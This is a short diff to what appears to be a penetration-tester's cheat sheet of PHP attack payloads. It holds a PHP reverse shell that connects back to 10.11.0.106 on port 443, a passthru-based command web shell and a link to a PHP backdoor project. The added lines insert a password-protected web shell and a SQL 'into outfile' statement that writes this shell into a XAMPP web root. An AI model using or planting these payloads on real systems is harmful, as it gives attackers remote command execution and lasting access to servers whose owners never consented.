@@ -8,6 +8,9 @@
 
 WEB PHP REVERSE SHELL => <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
 
+<?php if (md5($_GET['password']) ==‘4fe7aa8a3013d07e292e5218c3db4944') { system($_GET['cmd']); } ?>
+select "<?php if (md5($_GET['password']) == '4fe7aa8a3013d07e292e5218c3db4944') { system($_GET['cmd']); } ?>" into outfile "c:/xampp/htdocs/xampp/xampp.php";
+
 Another useful PHP methods: system, shell_exec, passthru = <?php passthru($_GET['cmd']);?>, backtrick operator ``, popen, exec, pcntl_exec, proc_open
 
 PHP BACKDOOR: https://github.com/b374k/b374k
